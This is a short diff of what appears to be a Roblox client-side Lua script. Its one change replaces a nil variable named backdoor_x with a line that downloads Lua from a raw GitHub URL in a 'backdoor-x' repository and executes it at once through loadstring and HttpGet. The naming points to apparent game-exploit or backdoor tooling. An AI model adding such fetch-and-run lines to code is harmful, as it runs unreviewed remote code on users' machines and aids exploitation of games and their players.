@@ -1,7 +1,7 @@
 local start = tick()
 print('begin')
 local debuging = true
-local backdoor_x = nil
+local backdoor_x = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiBiRiK/backdoor-x/main/ui.lua"))();
 local tweenService = game:GetService("TweenService")
 local inputService = game:GetService("UserInputService")
 local localPlayer = game:GetService("Players").LocalPlayer
